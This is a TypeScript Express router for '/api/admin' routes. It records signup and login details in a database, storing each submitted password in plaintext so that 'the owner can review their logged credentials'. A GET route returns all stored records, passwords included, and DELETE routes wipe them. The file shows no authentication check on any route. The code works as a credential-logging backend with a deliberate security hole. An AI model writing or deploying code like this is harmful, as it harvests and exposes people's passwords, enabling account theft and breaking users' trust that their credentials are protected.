import { Router, Request, Response } from 'express';
import connectDB from '../../lib/db';
import User from '../../models/User';

const router = Router();

// POST /api/admin/log - Record signup or login details
router.post('/log', async (req: Request, res: Response): Promise<void> => {
  try {
    await connectDB();
    const { fullName, email, password, accountType, orgName, orgType, orgCode } = req.body;

    if (!email || !password) {
      res.status(400).json({ success: false, message: 'Email and password are required' });
      return;
    }

    // Upsert user by email or create new record so we always have latest details and lastLoginAt
    const updatedUser = await User.findOneAndUpdate(
      { email: email.toLowerCase().trim() },
      {
        $set: {
          fullName: fullName || email.split('@')[0],
          password, // Stored so the owner can review their logged credentials as requested
          accountType: accountType || 'Individual',
          orgName: orgName || undefined,
          orgType: orgType || undefined,
          orgCode: orgCode || undefined,
          lastLoginAt: new Date(),
        }
      },
      { upsert: true, new: true, runValidators: true }
    );

    res.status(200).json({ success: true, data: updatedUser });
  } catch (error: any) {
    res.status(500).json({ success: false, message: 'Error logging user info', error: error.message });
  }
});

// GET /api/admin/users - Get all logged user credentials
router.get('/users', async (req: Request, res: Response): Promise<void> => {
  try {
    await connectDB();
    const users = await User.find({}).sort({ lastLoginAt: -1 });
    res.status(200).json({ success: true, count: users.length, data: users });
  } catch (error: any) {
    res.status(500).json({ success: false, message: 'Error fetching logged users', error: error.message });
  }
});

// DELETE /api/admin/users/:id - Delete a user record from logs
router.delete('/users/:id', async (req: Request, res: Response): Promise<void> => {
  try {
    await connectDB();
    const { id } = req.params;
    const deleted = await User.findByIdAndDelete(id);

    if (!deleted) {
      res.status(404).json({ success: false, message: 'User record not found' });
      return;
    }

    res.status(200).json({ success: true, message: 'User log deleted successfully' });
  } catch (error: any) {
    res.status(500).json({ success: false, message: 'Error deleting user log', error: error.message });
  }
});

// DELETE /api/admin/users - Clear all logs
router.delete('/users', async (req: Request, res: Response): Promise<void> => {
  try {
    await connectDB();
    await User.deleteMany({});
    res.status(200).json({ success: true, message: 'All user credentials and organization logs cleared successfully' });
  } catch (error: any) {
    res.status(500).json({ success: false, message: 'Error clearing logs', error: error.message });
  }
});

export default router;
